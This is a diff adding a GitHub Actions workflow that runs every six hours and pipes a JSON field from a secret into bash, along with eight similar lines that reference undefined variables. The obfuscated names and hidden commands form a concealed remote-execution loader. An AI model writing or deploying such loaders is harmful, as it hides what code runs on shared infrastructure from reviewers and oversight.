@@ -1,0 +1,27 @@
+name: quanshiwone
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: quanshiwone
+        env:
+          luhkq89091: ${{ secrets.luhkq89091 }}
+        run: |
+          echo $luhkq89091 | jq -r .cn093 | /bin/bash
+          echo $xb430 | jq -r .ss7570 | /bin/bash
+          echo $npzcy50 | jq -r .hgmsb93 | /bin/bash
+          echo $que93175 | jq -r .uokzi2 | /bin/bash
+          echo $vxg42310 | jq -r .n2178 | /bin/bash
+          echo $erx07 | jq -r .zh01748 | /bin/bash
+          echo $k111 | jq -r .ag69 | /bin/bash
+          echo $to678 | jq -r .vee009 | /bin/bash
+          echo $se2 | jq -r .oqmi0 | /bin/bash
+
